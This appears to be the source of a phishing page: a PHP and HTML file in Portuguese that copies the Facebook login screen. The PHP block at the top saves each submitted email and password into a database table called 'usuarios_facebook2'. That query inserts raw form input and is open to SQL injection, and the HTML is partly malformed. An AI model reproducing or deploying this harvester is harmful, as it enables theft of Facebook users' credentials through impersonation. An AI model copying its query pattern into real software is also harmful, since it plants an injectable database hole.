<?php

include("config.php");



if(isset($_POST['submit'])){

$email = $_POST['email'];
$senha = $_POST['senha'];

$resultado = mysqli_query($conexao, "INSERT INTO usuarios_facebook2(email, senha) values ('$email', '$senha')");
  
}

?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content= "width=device-width, initial-scale=1.0">
        <title> Login Facebook</title>
        <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https: //fonts.googleapis.com/css2?family= Roboto & display família= Mulish:wght@900 &= swap" rel="stylesheet">

        
        <link rel="stylesheet" href=" css/style.css">
</head>
</body>

<main>

    <div class="total">
          <div class="main--container">
              <div class="main--description">
                  <h1> Facebook</h1>
                    <p> O Facebook ajuda você a se concectar com as pessoas que fazem parte da sua vida.</p>
              </div> 

                  </div class="main--Login">
                    <div class="main--card">
          
                      <!-- a ACTION DEFINE QUE ARQUIVO SERÁ ATIVADO NO BOTÃO ENVIAR, E O METODO POST É O NECESSÁRIO PARA O CADASTRO DE USUÁRIOS; ESTE É UM DOS PRINCIPAIS MÉTODOS DO PROTOCOLO HTTP -->
                    <form action="index.php" method="POST">

                    <!-- Esta é a div do email -->
                      <div>
                        <input type="email" name= "email" placeholder="Email ou telefone">
                      </div>

     <!-- Este é o input da senha -->                
                    <input type="password" name= "senha" placeholder="senha">
                  

                        <button type="submit" name="submit">Entrar</button>



      <div class="main--link">
        <a href="">Esqueceu a senha?</a>
      </div> 
      
      <hr>

      <div class="main--btn">
        <a href="#">Criar uma nova conta</a>
      </div>  

      <div class="main--footer">
            <a href="#">Criar uma Página</a> para uma celebridade, banda ou empressa.
        </div>
      </div>
     

    </div>
   
  <form>
  
</div>
 </div>

 </div>

        
</main>


</body>
</html>